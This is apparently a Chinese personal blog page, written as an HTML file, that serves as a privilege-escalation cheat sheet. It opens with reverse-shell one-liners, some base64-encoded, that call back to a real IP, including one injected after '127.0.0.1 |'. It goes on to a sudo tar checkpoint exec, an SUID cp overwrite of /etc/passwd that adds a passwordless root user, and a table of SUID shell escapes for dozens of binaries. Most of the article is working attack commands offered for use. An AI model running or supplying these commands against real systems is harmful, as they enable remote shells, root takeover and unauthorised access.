@@ -1,0 +1,934 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/tubiao.png">
+  <link rel="icon" href="/img/tubiao.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#4F4F4F">
+  <meta name="author" content="chen">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="用VPS反弹shell攻击机监听端口 1nc -lvp 2333  目标机 123127.0.0.1 | echo YmFzaCAtaSA+JiAvZGV2L3RjcC80Ny4xMjIuNzUuMTI2LzIzMzMgMD4mMQ&#x3D;&#x3D; | base64 -d| &#x2F;bin&#x2F;bash127.0.0.1 | echo bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;47.122.75.126&#x2F;2">
+<meta property="og:type" content="article">
+<meta property="og:title" content="提权">
+<meta property="og:url" content="https://yschen20.github.io/2025/04/25/%E6%8F%90%E6%9D%83/index.html">
+<meta property="og:site_name" content="(๑´ڡ&#96;๑)">
+<meta property="og:description" content="用VPS反弹shell攻击机监听端口 1nc -lvp 2333  目标机 123127.0.0.1 | echo YmFzaCAtaSA+JiAvZGV2L3RjcC80Ny4xMjIuNzUuMTI2LzIzMzMgMD4mMQ&#x3D;&#x3D; | base64 -d| &#x2F;bin&#x2F;bash127.0.0.1 | echo bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;47.122.75.126&#x2F;2">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2025-04-25T07:35:03.000Z">
+<meta property="article:modified_time" content="2025-04-25T07:35:19.225Z">
+<meta property="article:author" content="chen">
+<meta property="article:tag" content="小知识">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:creator" content="@chen">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>提权 - (๑´ڡ`๑)</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"yschen20.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2025-04-25T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>小晨的博客</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/2.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="提权"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-author" aria-hidden="true"></i>
+        chen
+      </span>
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2025-04-25 15:35" pubdate>
+          2025年4月25日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          969 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          9 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="busuanzi_container_page_pv" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="busuanzi_value_page_pv"></span> 次
+        </span>
+        
+
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">提权</h1>
+            
+              <p id="updated-time" class="note note-info" style="display: none">
+                
+                  
+                    本文最后更新于 2025-04-25T15:35:19+08:00
+                  
+                  
+
+                
+              </p>
+            
+            
+              <div class="markdown-body">
+                
+                <h2 id="用VPS反弹shell"><a href="#用VPS反弹shell" class="headerlink" title="用VPS反弹shell"></a>用VPS反弹shell</h2><p><strong>攻击机监听端口</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nc -lvp 2333<br></code></pre></td></tr></table></figure>
+
+<p><strong>目标机</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">127.0.0.1 | <span class="hljs-built_in">echo</span> YmFzaCAtaSA+JiAvZGV2L3RjcC80Ny4xMjIuNzUuMTI2LzIzMzMgMD4mMQ== | <span class="hljs-built_in">base64</span> -d| /bin/bash<br>127.0.0.1 | <span class="hljs-built_in">echo</span> bash -i &gt;&amp; /dev/tcp/47.122.75.126/2333 0&gt;&amp;1<br>nc -e /bin/sh 47.122.75.126 2333<br></code></pre></td></tr></table></figure>
+
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><h3 id="已知一个用户的密码"><a href="#已知一个用户的密码" class="headerlink" title="已知一个用户的密码"></a><strong>已知一个用户的密码</strong></h3><ul>
+<li>用<code>cat /etc/passwd</code>命令来查看用户</li>
+<li>用<code>su 用户名</code>命令来切换用户，尝试出已知的密码是哪一个用户的</li>
+<li>用<code>sudo -l</code>命令来查看当前用户的权限</li>
+</ul>
+<h3 id="tar包提权"><a href="#tar包提权" class="headerlink" title="tar包提权"></a><strong>tar包提权</strong></h3><p>如果管理员给予了某个普通用户tar命令的超级管理员操作</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">sudo -u root tar cf /dev/null exploit --checkpoint=1 --checkpoint-action=exec=&quot;/bin/bash&quot;<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li><code>-c</code>：创建新的档案文件，相当于打包（-x，相反的操作，拆包）</li>
+<li><code>-f</code>：使用档名，f之后直接加档名，中间不能加其他参数</li>
+<li><code>--checkpoint=n</code>：每写入n个记录之后设置一个检查点，在检查点可以执行任意的操作，操作由 –checkpoint-action 指定</li>
+<li><code>exec</code>：执行外部命令</li>
+</ul>
+<p>执行这个命令后就提权成功了，用<code>id</code>命令查看当前用户发现已经是root，此时可以自由查看 &#x2F;root 文件中的内容</p>
+<h3 id="suid-cp提权"><a href="#suid-cp提权" class="headerlink" title="suid cp提权"></a><strong>suid cp提权</strong></h3><p>用命令查找是否存在suid提权的可能</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">find / -perm -u=s -type f 2&gt;/dev/null<br></code></pre></td></tr></table></figure>
+
+<p>看到<code>/bin/cp</code>就知道可以用 cp 提权了<br>操作步骤：先构造一个和&#x2F;etc&#x2F;passwd里一样的文件 然后在文件的末尾加上一个用户 这个用户的相关信息都可以随你编写 再利用cp的高权限对&#x2F;etc&#x2F;passwd文件进行覆盖 </p>
+<h4 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a><strong>方法一</strong></h4><p>在&#x2F;tmp新建一个passwd文件，在tmp的原因是因为tmp目录是临时缓存目录 一般访问和修改权限较低但可执行权限较高</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">echo &quot;hacker::0:0:hacker:/home/hacker:/bin/bash&quot; &gt;&gt;/tmp/passwd<br></code></pre></td></tr></table></figure>
+
+<p>然后回到命令行使用 cp 命令把 &#x2F;etc&#x2F;passwd 用 &#x2F;tmp&#x2F;passwd 替换掉</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">cp /tmp/passwd /etc/passwd<br></code></pre></td></tr></table></figure>
+
+<p>然后<code>cat /etc/passwd</code>查看 &#x2F;etc&#x2F;passwd 可以看到有了hacker用户</p>
+<p>使用<code>su hacker</code>命令切换成hacker用户</p>
+<p>此时我们拥有root权限，就可以查看root文件里的内容了</p>
+<h4 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a><strong>方法二</strong></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plain">cp /bin/bash /tmp<br>/bin/cp --attributes-only --preserve=all /bin/cp /tmp/bash<br>/tmp/bash -p<br></code></pre></td></tr></table></figure>
+
+<p>依次执行完这三个命令</p>
+<p>用<code>id</code>命令可以看到euid已经是root了，用<code>whoami</code>可以看到是root</p>
+<p>此时就可以查看root文件里的内容</p>
+<h3 id="suid-gdb提权"><a href="#suid-gdb提权" class="headerlink" title="suid gdb提权"></a>suid gdb提权</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">gdb -nx -ex &#x27;python import os; os.execl(&quot;/bin/sh&quot;, &quot;sh&quot;, &quot;-p&quot;)&#x27; -ex quit<br></code></pre></td></tr></table></figure>
+
+<h3 id="常用提权命令"><a href="#常用提权命令" class="headerlink" title="常用提权命令"></a>常用提权命令</h3><table>
+<thead>
+<tr>
+<th><strong><font style="color:rgb(0, 161, 251);">命令</font></strong></th>
+<th><strong><font style="color:rgb(0, 161, 251);">利用方法</font></strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td>zsh</td>
+<td>zsh</td>
+</tr>
+<tr>
+<td><strong>xargs</strong></td>
+<td>xargs -a &#x2F;dev&#x2F;null sh -p</td>
+</tr>
+<tr>
+<td><strong>watch</strong></td>
+<td>watch -x sh -c ‘reset; exec sh -p 1&gt;&amp;0 2&gt;&amp;0’</td>
+</tr>
+<tr>
+<td><strong>timeout</strong></td>
+<td>timeout 7d &#x2F;bin&#x2F;sh -p</td>
+</tr>
+<tr>
+<td><strong>time</strong></td>
+<td>time &#x2F;bin&#x2F;sh -p</td>
+</tr>
+<tr>
+<td><strong>tclsh</strong></td>
+<td>+ tclsh <br/>+ exec &#x2F;bin&#x2F;sh -p &lt;@stdin &gt;@stdout 2&gt;@stderr</td>
+</tr>
+<tr>
+<td><strong>taskset</strong></td>
+<td>taskset 1 &#x2F;bin&#x2F;sh -p</td>
+</tr>
+<tr>
+<td><strong>stdbuf</strong></td>
+<td>stdbuf -i0 &#x2F;bin&#x2F;sh -p</td>
+</tr>
+<tr>
+<td><strong>strace</strong></td>
+<td>strace -o &#x2F;dev&#x2F;null &#x2F;bin&#x2F;sh -p</td>
+</tr>
+<tr>
+<td><strong>ssh</strong></td>
+<td>ssh -o ProxyCommand&#x3D;’;sh -p 0&lt;&amp;2 1&gt;&amp;2’ x</td>
+</tr>
+<tr>
+<td><strong>setarch</strong></td>
+<td>setarch $(arch) &#x2F;bin&#x2F;sh -p</td>
+</tr>
+<tr>
+<td><strong>rsync</strong></td>
+<td>rsync -e ‘sh -p -c “sh -p 0&lt;&amp;2 1&gt;&amp;2”’ 127.0.0.1:&#x2F;dev&#x2F;null</td>
+</tr>
+<tr>
+<td><strong>rpm</strong></td>
+<td>rpm –eval ‘%{lua:os.execute(“&#x2F;bin&#x2F;sh -p”)}’</td>
+</tr>
+<tr>
+<td><strong>python</strong></td>
+<td>python -c ‘import os; os.execl(“&#x2F;bin&#x2F;sh”, “sh”, “-p”)’</td>
+</tr>
+<tr>
+<td><strong>php</strong></td>
+<td>+  CMD&#x3D;”&#x2F;bin&#x2F;sh”  <br/>+  php -r “pcntl_exec(’&#x2F;bin&#x2F;sh’, [’-p’]);”</td>
+</tr>
+<tr>
+<td><strong>nice</strong></td>
+<td>nice &#x2F;bin&#x2F;sh -p</td>
+</tr>
+<tr>
+<td><strong>nano</strong></td>
+<td>+  nano &#x2F;&#x2F;运行nano程序  <br/>+  ^R &#x2F;&#x2F;按下ctrl-r  <br/>+  ^X &#x2F;&#x2F;按下ctrl-x 4、reset; sh -p 1&gt;&amp;0 2&gt;&amp;0 &#x2F;&#x2F;输入下面的命令</td>
+</tr>
+<tr>
+<td><strong>more</strong></td>
+<td>+  more &#x2F;etc&#x2F;profile<br/>+  !&#x2F;bin&#x2F;sh -p</td>
+</tr>
+<tr>
+<td><strong>logsave</strong></td>
+<td>logsave &#x2F;dev&#x2F;null &#x2F;bin&#x2F;sh -i -p</td>
+</tr>
+<tr>
+<td><strong>less</strong></td>
+<td>less &#x2F;etc&#x2F;profile &#x2F;&#x2F;读取文件，在底行输入!&#x2F;bin&#x2F;sh -p</td>
+</tr>
+<tr>
+<td><strong>ksh</strong></td>
+<td>ksh -p</td>
+</tr>
+<tr>
+<td><strong>ip</strong></td>
+<td>+  ip netns add foo  <br/>+  ip netns exec foo &#x2F;bin&#x2F;sh -p  <br/>+  ip netns delete foo</td>
+</tr>
+<tr>
+<td><strong>ionice</strong></td>
+<td>ionice &#x2F;bin&#x2F;sh -p</td>
+</tr>
+<tr>
+<td><strong>git</strong></td>
+<td>git help status</td>
+</tr>
+<tr>
+<td><strong>gimp</strong></td>
+<td>gimp -idf –batch-interpreter&#x3D;python-fu-eval -b ‘import os; os.execl(“&#x2F;bin&#x2F;sh”, “sh”, “-p”)’</td>
+</tr>
+<tr>
+<td><strong>gdb</strong></td>
+<td>gdb -nx -ex ‘python import os; os.execl(“&#x2F;bin&#x2F;sh”, “sh”, “-p”)’ -ex quit</td>
+</tr>
+<tr>
+<td><strong>ftp</strong></td>
+<td>ftp &#x2F;&#x2F;在底行输入“!&#x2F;bin&#x2F;sh -p”</td>
+</tr>
+<tr>
+<td><strong>flock</strong></td>
+<td>flock -u &#x2F; &#x2F;bin&#x2F;sh -p</td>
+</tr>
+<tr>
+<td><strong>find</strong></td>
+<td>find . -exec &#x2F;bin&#x2F;sh -p ; -quit</td>
+</tr>
+<tr>
+<td><strong>expect</strong></td>
+<td>expect -c ‘spawn &#x2F;bin&#x2F;sh -p;interact’</td>
+</tr>
+<tr>
+<td><strong>env</strong></td>
+<td>env &#x2F;bin&#x2F;sh -p</td>
+</tr>
+<tr>
+<td><strong>ed</strong></td>
+<td>ed &#x2F;&#x2F;在底行输入“!&#x2F;bin&#x2F;sh -p”</td>
+</tr>
+<tr>
+<td><strong>docker</strong></td>
+<td>docker run -v &#x2F;:&#x2F;mnt –rm -it alpine chroot &#x2F;mnt sh</td>
+</tr>
+<tr>
+<td><strong>dmesg</strong></td>
+<td>dmesg -H&#x2F;&#x2F;在底行输入“!&#x2F;bin&#x2F;sh -p”</td>
+</tr>
+<tr>
+<td><strong>csh</strong></td>
+<td>csh -b</td>
+</tr>
+<tr>
+<td><strong>bash</strong></td>
+<td>bash -p</td>
+</tr>
+<tr>
+<td><strong>awk</strong></td>
+<td>awk ‘BEGIN {system(“&#x2F;bin&#x2F;bash -p”)}’</td>
+</tr>
+<tr>
+<td><strong>perl</strong></td>
+<td>perl exec “&#x2F;bin&#x2F;bash”;</td>
+</tr>
+</tbody></table>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E5%B0%8F%E7%9F%A5%E8%AF%86/" class="category-chain-item">小知识</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/%E5%B0%8F%E7%9F%A5%E8%AF%86/" class="print-no-link">#小知识</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>提权</div>
+      <div>https://yschen20.github.io/2025/04/25/提权/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>chen</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2025年4月25日</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>更新于</div>
+          <div>2025年4月25日</div>
+        </div>
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2025/04/25/sprintf%E6%BC%8F%E6%B4%9E/" title="sprintf漏洞">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">sprintf漏洞</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2025/04/25/MD5%E7%BB%95%E8%BF%87/" title="MD5绕过">
+                        <span class="hidden-mobile">MD5绕过</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="busuanzi_container_site_pv" style="display: none">
+        总访问量 
+        <span id="busuanzi_value_site_pv"></span>
+         次
+      </span>
+    
+    
+      <span id="busuanzi_container_site_uv" style="display: none">
+        总访客数 
+        <span id="busuanzi_value_site_uv"></span>
+         人
+      </span>
+    
+    
+
+  
+
+</div>
+
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  var relativeDate = function() {
+    var updatedTime = document.getElementById('updated-time');
+    if (updatedTime) {
+      var text = updatedTime.textContent;
+      var reg = /\d{4}-\d{2}-\d{2}T\d{2}:\d{2}:\d{2}(?:Z|[+-]\d{2}:\d{2})/;
+      var matchs = text.match(reg);
+      if (matchs) {
+        var relativeTime = moment(matchs[0]).fromNow();
+        updatedTime.textContent = text.replace(reg, relativeTime);
+      }
+      updatedTime.style.display = '';
+    }
+  };
+  Fluid.utils.createScript('https://lib.baomitu.com/moment.js/2.29.4/moment.min.js', function() {
+    if (!'zh-cn'.startsWith('en')) {
+      Fluid.utils.createScript('https://lib.baomitu.com/moment.js/2.29.4/locale/zh-cn.min.js', function() {
+        relativeDate();
+      });
+    } else {
+      relativeDate();
+    }
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
